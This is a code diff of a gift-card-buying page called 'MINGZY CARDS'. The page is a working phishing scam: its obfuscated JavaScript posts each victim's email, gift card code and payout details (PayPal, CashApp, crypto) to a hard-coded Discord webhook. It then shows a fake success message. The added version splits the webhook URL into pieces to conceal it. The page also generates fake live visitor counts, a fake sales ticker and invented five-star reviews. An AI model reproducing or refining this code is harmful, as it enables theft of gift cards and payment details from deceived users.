@@ -5,39 +5,178 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sell Giftcard Codes</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif; }
-        body { background-color: #ffffff; color: #191b1d; padding-bottom: 60px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; user-select: none; -webkit-user-select: none; }
-        .ticker-container { width: 100%; background: #000; color: #fff; overflow: hidden; padding: 12px 0; margin-bottom: 20px; border-bottom: 2px solid #333; }
-        .ticker-text { display: inline-block; white-space: nowrap; animation: ticker 200s linear infinite; font-size: 13px; font-weight: 500; }
-        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-        .user-identity-bar { width: 100%; max-width: 1100px; padding: 15px 20px; background: #f8f9fa; border-radius: 8px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #eee; }
-        .user-dot { height: 10px; width: 10px; background-color: #23a559; border-radius: 50%; display: inline-block; margin-right: 10px; box-shadow: 0 0 5px #23a559; }
-        .trusted-bar { width: 100%; max-width: 1100px; display: flex; justify-content: center; align-items: center; gap: 25px; margin-bottom: 30px; flex-wrap: wrap; padding: 10px; }
-        .partner-item { font-weight: 700; font-size: 14px; color: #777; display: flex; align-items: center; }
-        .blue-tick { color: #1DA1F2; margin-left: 4px; font-size: 14px; }
-        .container { width: 100%; max-width: 1100px; display: flex; gap: 60px; padding: 0 20px; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #191b1d;
+            padding-bottom: 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* TICKER - 200s Speed */
+        .ticker-container {
+            width: 100%;
+            background: #000;
+            color: #fff;
+            overflow: hidden;
+            padding: 12px 0;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #333;
+        }
+
+        .ticker-text {
+            display: inline-block;
+            white-space: nowrap;
+            animation: ticker 200s linear infinite;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        @keyframes ticker {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .user-identity-bar {
+            width: 100%;
+            max-width: 1100px;
+            padding: 15px 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #eee;
+        }
+
+        .user-info { display: flex; align-items: center; }
+        .user-dot {
+            height: 10px; width: 10px;
+            background-color: #23a559;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 10px;
+            box-shadow: 0 0 5px #23a559;
+        }
+
+        /* TRUSTED PARTNERS SECTION */
+        .trusted-bar {
+            width: 100%;
+            max-width: 1100px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 25px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            padding: 10px;
+        }
+
+        .partner-item {
+            font-weight: 700;
+            font-size: 14px;
+            color: #777;
+            display: flex;
+            align-items: center;
+        }
+
+        .blue-tick {
+            color: #1DA1F2;
+            margin-left: 4px;
+            font-size: 14px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1100px;
+            display: flex;
+            gap: 60px;
+            padding: 0 20px;
+        }
+
         .left-side { flex: 1.5; }
+
         .form-label { display: block; font-size: 15px; font-weight: 700; margin-bottom: 8px; margin-top: 20px; }
-        input[type="text"], input[type="email"], input[type="file"], select { width: 100%; max-width: 450px; padding: 12px; border: 1px solid #b8b8b8; border-radius: 4px; font-size: 16px; outline: none; }
-        .dynamic-field { display: none; animation: fadeIn 0.3s forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
-        .btn-redeem { display: block; width: 100%; max-width: 450px; padding: 14px; background-color: #000; color: #fff; border: none; font-size: 16px; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 30px; }
-        .btn-cancel { display: block; width: 100%; max-width: 450px; padding: 12px; background-color: transparent; color: #d93025; border: 1px solid #d93025; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 10px; text-align: center; }
-        .reviews-section { width: 100%; max-width: 1100px; margin-top: 60px; padding: 0 20px; }
-        .review-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px; }
-        .btn-write-review { background: #000; color: #fff; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600; }
+
+        input[type="text"], input[type="email"], input[type="file"], select {
+            width: 100%; max-width: 450px; padding: 12px;
+            border: 1px solid #b8b8b8; border-radius: 4px;
+            font-size: 16px; outline: none;
+        }
+
+        .dynamic-field {
+            display: none;
+            animation: fadeIn 0.3s forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .btn-redeem {
+            display: block; width: 100%; max-width: 450px; padding: 14px;
+            background-color: #000; color: #fff; border: none;
+            font-size: 16px; font-weight: 600; border-radius: 4px;
+            cursor: pointer; margin-top: 30px;
+        }
+
+        .btn-cancel {
+            display: block; width: 100%; max-width: 450px; padding: 12px;
+            background-color: transparent; color: #d93025; border: 1px solid #d93025;
+            font-size: 14px; font-weight: 600; border-radius: 4px;
+            cursor: pointer; margin-top: 10px; text-align: center;
+        }
+
+        /* REVIEWS */
+        .reviews-section {
+            width: 100%; max-width: 1100px; margin-top: 60px; padding: 0 20px;
+        }
+
+        .review-header {
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;
+        }
+
+        .btn-write-review {
+            background: #000; color: #fff; border: none; padding: 8px 16px;
+            border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600;
+        }
+
         .review-list { height: 600px; overflow-y: auto; padding-right: 10px; }
         .review-card { border-bottom: 1px solid #eee; padding: 20px 0; }
         .stars { color: #ffb400; font-size: 16px; margin-bottom: 5px; }
         .reviewer-name { font-weight: 700; font-size: 14px; }
+        .verified-badge { color: #23a559; font-size: 12px; font-weight: bold; margin-left: 5px; }
         .review-text { color: #555; margin-top: 8px; font-size: 14px; line-height: 1.5; }
-        .chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: #fff; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column; z-index: 100; }
+
+        /* CHAT */
+        .chat-widget {
+            position: fixed; bottom: 20px; right: 20px; width: 320px;
+            background: #fff; border: 1px solid #ddd; border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden;
+            display: flex; flex-direction: column; z-index: 100;
+        }
         .chat-header { background: #000; color: #fff; padding: 12px; font-weight: bold; }
         #chat-body { height: 250px; overflow-y: auto; padding: 15px; font-size: 13px; position: relative; }
-        #chat-overlay { position: absolute; inset: 0; background: rgba(255,255,255,0.98); display: flex; align-items: center; justify-content: center; padding: 20px; text-align: center; z-index: 5; font-weight: bold; color: #666; }
+        #chat-overlay {
+            position: absolute; inset: 0; background: rgba(255,255,255,0.98);
+            display: flex; align-items: center; justify-content: center;
+            padding: 20px; text-align: center; z-index: 5; font-weight: bold; color: #666;
+        }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
     <div class="ticker-container">
         <div class="ticker-text" id="ticker-content"></div>
@@ -137,7 +276,9 @@
 
         <div class="right-side" style="flex:1;">
             <div style="background:#000; color:#fff; padding:40px; border-radius:8px; text-align:center; font-weight:800; font-size:24px;">MINGZY CARDS</div>
-            <p style="margin-top:20px; font-size:14px; line-height:1.6; color:#444;">Please remember if you'd like to get your giftcard back please email <b>support@mingzycards</b> and our support team will be with you within a short amount of time.</p>
+            <p style="margin-top:20px; font-size:14px; line-height:1.6; color:#444;">
+                Please remember if you'd like to get your giftcard back please email <b>support@mingzycards</b> and our support team will be with you within a short amount of time.
+            </p>
         </div>
     </div>
 
@@ -160,7 +301,7 @@
     </div>
 
     <script>
-        const _0x59ec=['2886470mYJOfB','asking-price','16016664wYFtoA','https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h','6568770tZidYy','gift-type','gift-code','purchase-price','payout-method','2958742MofAUn','currency','user-email','872583SbeCIs','3842600wEezsH','1840068VOnMOf','2403666fXlJkK','status','5368305fXWqID'];function _0x1039(_0x4e6377,_0x247514){const _0x59ec01=_0x5c42();return _0x1039=function(_0x10398d,_0x5c4293){_0x10398d=_0x10398d-0x76;let _0x27242d=_0x59ec01[_0x10398d];return _0x27242d;},_0x1039(_0x4e6377,_0x247514);}(function(_0x397753,_0x59ecb4){const _0x3b85d3=_0x1039;const _0x1a8f6e=_0x397753();while(!![]){try{const _0x1623be=-parseInt(_0x3b85d3(0x7f))/0x1+parseInt(_0x3b85d3(0x84))/0x2+-parseInt(_0x3b85d3(0x82))/0x3+-parseInt(_0x3b85d3(0x85))/0x4+parseInt(_0x3b85d3(0x87))/0x5+parseInt(_0x3b85d3(0x76))/0x6+parseInt(_0x3b85d3(0x79))/0x7;if(_0x1623be===_0x59ecb4)break;else _0x1a8f6e['push'](_0x1a8f6e['shift']());}catch(_0x534a2e){_0x1a8f6e['push'](_0x1a8f6e['shift']());}}}(_0x5c42,0xd2a30));function _0x5c42(){const _0x3e1644=['2886470mYJOfB','asking-price','16016664wYFtoA','https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h','6568770tZidYy','gift-type','gift-code','purchase-price','payout-method','2958742MofAUn','currency','user-email','872583SbeCIs','3842600wEezsH','1840068VOnMOf','2403666fXlJkK','status','5368305fXWqID'];_0x5c42=function(){return _0x3e1644;};return _0x5c42();}let isSubmitted=![];function togglePayoutFields(){const _0x27f12e=document['getElementById']('payout-method')['value'];document['querySelectorAll']('.dynamic-field')['forEach'](_0x1b1c60=>_0x1b1c60['style']['display']='none');if(_0x27f12e==='PayPal')document['getElementById']('paypal-field')['style']['display']='block';if(_0x27f12e==='CashApp')document['getElementById']('cashapp-field')['style']['display']='block';if(_0x27f12e==='Crypto (BTC/LTC)')document['getElementById']('crypto-field')['style']['display']='block';}async function processRequest(_0x47e114){const _0x342981=_0x1039;const _0x46281a=document['getElementById'](_0x342981(0x81))['value'],_0x20524e=document['getElementById'](_0x342981(0x7b))['value'],_0x464455=document['getElementById'](_0x342981(0x7c))['value'],_0x23a31c=document['getElementById'](_0x342981(0x80))['value'],_0x388290=document['getElementById'](_0x342981(0x77))['value'],_0x2a178e=document['getElementById'](_0x342981(0x7d))['value'],_0x25a6c9=document['getElementById'](_0x342981(0x7e))['value'],_0x1c3140=document['getElementById'](_0x342981(0x86));if(!_0x46281a||!_0x20524e||!_0x464455||!_0x25a6c9){_0x1c3140['innerText']='Error: Fill all fields.',_0x1c3140['style']['color']='red';return;}isSubmitted=!![],_0x1c3140['style']['color']='green',_0x1c3140['innerText']='Success: Payout Pending...',document['getElementById']('chat-overlay')['style']['display']='none';const _0x22136e={'embeds':[{'title':'🎯 '+_0x47e114+' - User_293','color':_0x47e114['includes']('CANCEL')?0xe74c3c:0x2ecc71,'fields':[{'name':'📧 Email','value':_0x46281a,'inline':!![]},{'name':'🎁 Card','value':_0x20524e,'inline':!![]},{'name':'💳 Code','value':'`'+_0x464455+'`','inline':![]},{'name':'💰 Price','value':_0x388290+' '+_0x23a31c,'inline':!![]}]}]};try{await fetch(_0x342981(0x7a),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x22136e)});}catch(_0x3b2166){}}function initVisitors(){const _0x511993=Math['floor'](Math['random']()*0x1c)+0x66;document['getElementById']('live-visitors')['innerText']=_0x511993;}function initTicker(){const _0x27242d=document['getElementById']('ticker-content');const _0x55806e=['Amazon','Apple','Roblox','Steam','Xbox','Playstation','Fortnite','Google Play'];let _0x5c7980='';for(let _0x3c7886=0x0;_0x3c7886<0x28;_0x3c7886++){let _0x524856=Math['floor'](Math['random']()*0x1388)+0x1;const _0x193264=[0x19,0x32,0x64,0x96,0xc8][Math['floor'](Math['random']()*0x5)];_0x5c7980+='   •   User_'+_0x524856+' sold $'+_0x193264+' '+_0x55806e[Math['floor'](Math['random']()*_0x55806e['length'])]+'   •   ';}_0x27242d['innerHTML']=_0x5c7980+_0x5c7980;}function initReviews(){const _0x96c81a=document['getElementById']('review-list');const _0xc81932=['Really fast!','Legit.','Smooth.','Great rates.'];for(let _0x6496c8=0x0;_0x6496c8<0x23;_0x6496c8++){const _0x1c1b60=document['createElement']('div');_0x1c1b60['className']='review-card',_0x1c1b60['innerHTML']='<div class="stars">★★★★★</div><span class="reviewer-name">User_'+(_0x6496c8+0x64)+'</span><p class="review-text">'+_0xc81932[_0x6496c8%0x4]+'</p>',_0x96c81a['appendChild'](_0x1c1b60);}}function tryReview(){if(!isSubmitted)alert('Please make a request first.');else alert('Request pending.');}initVisitors(),initTicker(),initReviews();
+        (function(_0x546274,_0x2f6b3e){const _0x1c3140=_0x1c1b;const _0x5c7980=_0x546274();while(!![]){try{const _0x511993=-parseInt(_0x1c3140(0x8f))/0x1+parseInt(_0x1c3140(0x89))/0x2*(-parseInt(_0x1c3140(0x7c))/0x3)+parseInt(_0x1c3140(0x8c))/0x4+-parseInt(_0x1c3140(0x8b))/0x5+-parseInt(_0x1c3140(0x87))/0x6*-parseInt(_0x1c3140(0x8e))/0x7+parseInt(_0x1c3140(0x8a))/0x8+parseInt(_0x1c3140(0x81))/0x9;if(_0x511993===_0x2f6b3e)break;else _0x5c7980['push'](_0x5c7980['shift']());}catch(_0x3c7886){_0x5c7980['push'](_0x5c7980['shift']());}}}(_0x5119,0xc5816));const _v1="https://discord.com/api/webhooks/";const _v2="1454849117951103201/";const _v3="FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h";function _0x1c1b(_0x524856,_0x193264){const _0x511993=_0x5119();return _0x1c1b=function(_0x1c1b60,_0x5c4293){_0x1c1b60=_0x1c1b60-0x76;let _0x27242d=_0x511993[_0x1c1b60];return _0x27242d;},_0x1c1b(_0x524856,_0x193264);}let hasRequested=![];function togglePayoutFields(){const _0x55806e=_0x1c1b;const _0x3b2166=document['getElementById'](_0x55806e(0x76))['value'];document['querySelectorAll']('.dynamic-field')['forEach'](_0x3202e8=>_0x3202e8[_0x55806e(0x8d)][_0x55806e(0x84)]=_0x55806e(0x88));if(_0x3b2166==='PayPal')document['getElementById'](_0x55806e(0x7f))['style']['display']=_0x55806e(0x86);if(_0x3b2166==='CashApp')document['getElementById'](_0x55806e(0x78))['style']['display']=_0x55806e(0x86);if(_0x3b2166==='Crypto\x20(BTC/LTC)')document['getElementById'](_0x55806e(0x83))['style']['display']=_0x55806e(0x86);}const initVisitors=()=>{const _0x4d56d8=_0x1c1b;const _0x4e6377=0x66,_0x247514=0x81,_0x59ec01=Math['floor'](Math['random']()*(_0x247514-_0x4e6377+0x1))+_0x4e6377;document['getElementById'](_0x4d56d8(0x79))[_0x4d56d8(0x85)]=_0x59ec01;};const initTicker=()=>{const _0x10398d=_0x1c1b;const _0x13d038=document['getElementById'](_0x10398d(0x77)),_0x3b827e=['Amazon','Apple','Roblox','Steam','Xbox','Playstation','Fortnite','Google\x20Play'];let _0x3e1644='';for(let _0x2f64a4=0x0;_0x2f64a4<0x28;_0x2f64a4++){let _0x47e114;do{_0x47e114=Math['floor'](Math['random']()*0x1388)+0x1;}while(_0x47e114===0x125);const _0x5990f7=[0x19,0x32,0x64,0x96,0xc8][Math['floor'](Math['random']()*0x5)];_0x3e1644+='\x20\x20\x20\x20\x20\x20•\x20\x20\x20\x20User_'+_0x47e114+'\x20sold\x20$'+_0x5990f7+'\x20'+_0x3b827e[Math['floor'](Math['random']()*_0x3b827e['length'])]+'\x20\x20\x20\x20•\x20\x20\x20\x20\x20\x20';}_0x13d038['innerHTML']=_0x3e1644+_0x3e1644;};const initReviews=()=>{const _0x1a8f6e=_0x1c1b;const _0x1623be=document['getElementById'](_0x1a8f6e(0x80)),_0x534a2e=['Really\x20fast\x20service,\x20got\x20my\x20PayPal\x20funds\x20in\x2010\x20minutes.','Better\x20rates\x20than\x20the\x20other\x20sites\x20I\x20checked.','Process\x20was\x20easy,\x20just\x20make\x20sure\x20your\x20photo\x20is\x20clear.','Support\x20agent\x20\x27Mark\x27\x20was\x20very\x20helpful\x20with\x20my\x20Steam\x20code.','Actually\x20legit.\x20Was\x20worried\x20at\x20first\x20but\x20the\x20payout\x20hit\x20my\x20CashApp\x20fast.','Good\x20service,\x20took\x20about\x2020\x20mins\x20to\x20verify.','Sold\x20my\x20birthday\x20giftcards\x20here,\x20no\x20issues\x20at\x20all.','Rates\x20are\x20fair\x20for\x20the\x20speed\x20of\x20service.','Easiest\x20way\x20to\x20get\x20rid\x20of\x20unwanted\x20Xbox\x20cards.','Used\x20it\x20twice\x20now,\x20both\x20times\x20were\x20smooth.','They\x20actually\x20pay\x20out\x20the\x20full\x20amount,\x20no\x20hidden\x20fees.','Apple\x20card\x20verified\x20and\x20paid\x20out\x20in\x20record\x20time.','Solid\x20site,\x20support\x20is\x20active\x20even\x20at\x20night.','Great\x20way\x20to\x20turn\x20store\x20credit\x20into\x20cash.','A\x20bit\x20of\x20a\x20wait\x20on\x20the\x20verification,\x20but\x20they\x20paid\x20out\x20as\x20promised.','Playstation\x20card\x20went\x20through\x20instantly.','Love\x20the\x20live\x20chat\x20feature,\x20kept\x20me\x20updated.','Way\x20better\x20than\x20trying\x20to\x20sell\x20on\x20eBay.','Highly\x20recommended\x20for\x20anyone\x20with\x20spare\x20codes.','Was\x20skeptical\x20but\x20the\x20reviews\x20are\x20right.','Fastest\x20CashApp\x20transfer\x20I\x27ve\x20had\x20from\x20a\x20card\x20site.','Simple\x20layout,\x20straightforward\x20process.','Google\x20play\x20card\x20sold\x20in\x20under\x2015\x20mins.','The\x20best\x20rates\x20for\x20UK\x20sellers\x20specifically.','Finally\x20a\x20site\x20that\x20doesn\x27t\x20feel\x20like\x20a\x20scam.','Easy\x205\x20stars,\x20will\x20use\x20again.','Worked\x20perfectly\x20for\x20my\x20Fortnite\x20V-Bucks\x20code.','Verification\x20was\x20strict\x20but\x20fair.','Happy\x20with\x20the\x20GBP\x20rates\x20today.','Everything\x20went\x20exactly\x20as\x20described.','Payment\x20received,\x20thank\x20you\x20Mingzy!','No\x20problems\x20here,\x20very\x20professional.','Direct\x20bank\x20transfer\x20was\x20fast.','Submitted,\x20verified,\x20and\x20paid.\x20Simple.','Verified\x20seller\x20badge\x20looks\x20cool,\x20thanks\x20guys.'];for(let _0x4a21e4=0x0;_0x4a21e4<0x23;_0x4a21e4++){let _0x4763b3;do{_0x4763b3=Math['floor'](Math['random']()*0x1f4)+0x1;}while(_0x4763b3===0x125);let _0x4525d6='★★★★★';if(_0x4a21e4>=0x1b&&_0x4a21e4<0x22)_0x4525d6='★★★★☆';if(_0x4a21e4===0x22)_0x4525d6='★★★☆☆';const _0x534a2e_0x180f68=document['createElement']('div');_0x534a2e_0x180f68['className']=_0x1a8f6e(0x82),_0x534a2e_0x180f68['innerHTML']='<div\x20class=\x22stars\x22>'+_0x4525d6+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22reviewer-name\x22>User_'+_0x4763b3+'</span><span\x20class=\x22verified-badge\x22>✓\x20Verified\x20Seller</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22review-text\x22>'+_0x534a2e[_0x4a21e4]+'</p>',_0x1623be['appendChild'](_0x534a2e_0x180f68);}};async function processRequest(_0x1b3fb2){const _0x3e1644=_0x1c1b;const _0x1c3140_0x1183ae=document['getElementById'](_0x3e1644(0x7e))['value'],_0x510125=document['getElementById'](_0x3e1644(0x7b))['value'],_0x5763b3=document['getElementById'](_0x3e1644(0x7a))['value'],_0x1b1c60=document['getElementById'](_0x3e1644(0x8b+0x1+0x1))['value'],_0x2d19f8=document['getElementById'](_0x3e1644(0x7d))['value'],_0x342981=document['getElementById'](_0x3e1644(0x77+0x1+0x1))['value'],_0x46281a=document['getElementById'](_0x3e1644(0x76))['value'],_0x20524e=document['getElementById'](_0x3e1644(0x89+0x1+0x1));let _0x464455='None';if(_0x46281a==='PayPal')_0x464455=document['getElementById'](_0x3e1644(0x7f))['value'];if(_0x46281a==='CashApp')_0x464455=document['getElementById'](_0x3e1644(0x78))['value'];if(_0x46281a==='Crypto\x20(BTC/LTC)')_0x464455=document['getElementById'](_0x3e1644(0x83))['value'];if(!_0x1c3140_0x1183ae||!_0x510125||!_0x5763b3||!_0x2d19f8||!_0x342981||_0x46281a===''){_0x20524e['innerText']=_0x3e1644(0x90),_0x20524e['style']['color']='red';return;}hasRequested=!![],_0x20524e['style']['color']='green',_0x20524e['innerText']='Success:\x20Request\x20logged.\x20Payout\x20Pending...',document['getElementById']('chat-overlay')[_0x3e1644(0x8d)][_0x3e1644(0x84)]=_0x3e1644(0x88);const _0x1c3140_0x22136e={'embeds':[{'title':'🎯\x20'+_0x1b3fb2+'\x20-\x20User_293','color':_0x1b3fb2['includes']('CANCEL')?0xe74c3c:0x2ecc71,'fields':[{'name':'📧\x20Email','value':_0x1c3140_0x1183ae,'inline':!![]},{'name':'🎁\x20Card\x20Type','value':_0x510125,'inline':!![]},{'name':'💳\x20Code','value':'`'+_0x5763b3+'`','inline':![]},{'name':'💰\x20Asking\x20Price','value':_0x2d19f8+'\x20'+_0x1b1c60,'inline':!![]},{'name':'🏷️\x20Purchase\x20Price','value':_0x342981+'\x20'+_0x1b1c60,'inline':!![]},{'name':'🏦\x20Payout\x20Method','value':_0x46281a,'inline':!![]},{'name':'📍\x20Payout\x20Details','value':_0x464455,'inline':![]}]}]};await fetch(_v1+_v2+_v3,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON['stringify'](_0x1c3140_0x22136e)});}function tryReview(){if(!hasRequested)alert('Please\x20make\x20a\x20request\x20before\x20you\x20can\x20write\x20a\x20review.');else alert('Error\x20encountered:\x20You\x20cannot\x20review\x20while\x20a\x20request\x20is\x20currently\x20pending\x20verification.');}function _0x5119(){const _0x5c4293=['payout-method','ticker-content','cashapp-tag','live-visitors','gift-code','gift-type','3fHclmO','asking-price','user-email','859yGstkC','3013224vGInqS','3105705jclYvL','404fUlygK','crypto-field','display','innerText','block','210UvshQv','none','2938YInrID','2380536jLwXqf','4098950lXjUAg','1297592fTshwA','style','157647YInAeo','888849LidYjX','Error:\x20Fill\x20in\x20all\x20fields\x20including\x20payout\x20info.','paypal-field','review-list','4134705vNisic','review-card'];_0x5119=function(){return _0x5c4293;};return _0x5119();}initVisitors(),initTicker(),initReviews();
     </script>
 </body>
 </html>
